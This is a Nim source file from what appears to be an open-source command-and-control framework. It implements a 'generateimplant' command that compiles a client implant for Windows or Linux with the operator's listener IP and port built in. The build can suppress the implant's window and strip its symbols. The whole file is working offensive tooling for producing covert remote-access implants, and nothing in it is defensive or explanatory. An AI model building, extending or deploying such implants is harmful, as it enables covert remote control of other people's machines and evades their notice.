import osproc, strutils, asyncdispatch, tables

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  
  var listenerType: string = flags.getOrDefault("listener", flags.getOrDefault("l", ""))
  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
  var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
  var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
  var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
  var autoConnectTime: string = flags.getOrDefault("autoconnect", flags.getOrDefault("t", "5000"))

  if listenerType == "":
    errorLog "you must specify a listener type, check 'help generateimplant' & https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
    return

  let args_split = listenerType.split(":")
  
  if len(args_split) == 2:
    case args_split[0]
    of "tcp":
      let listenerId = parseInt(args_split[1])

      if not ( (len(server.tcpListeners) - 1) >= listenerId ):
        errorLog "couldn't find tcp listener"
        return

      let tcpListener = server.tcpListeners[listenerId]
      ip = tcpListener.listeningIP
      port = $tcpListener.port

      if ip == "0.0.0.0":
        errorLog "can't automatically generate an implant for this listener because the listening ip is set to 0.0.0.0, you need to use the other command usage format"
        errorLog "generateimplant tcp (ip) (port) (platform)"
        return

      infoLog "generating implant for " & $tcpListener
  elif listenerType == "tcp" and ip == "" and port == "":
    errorLog "you must specify and --ip and --port for the tcp client"
    return

  let compileCommand = "nim c -d:client " &
    (if showWindow: "" else: "--app=gui " & " ") & # disable window 
    "--passL:-s" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:port=" & port & " " & 
    "-d:autoConnectTime=" & autoConnectTime & " " & 
    (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
    "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
    "./src/client/client.nim"

  echo "Running " & compileCommand
  let exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
  else:
    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant -l:[listenerID] -P:[platform] -t:[autoConnectTimeout]",
    "generateimplant -l:[listenerType] -i:[ip] -p:[port] -P:[platform] -t:[autoConnectTimeout]",
  ],
  description: "Generate an implant",
  category: CCImplants
)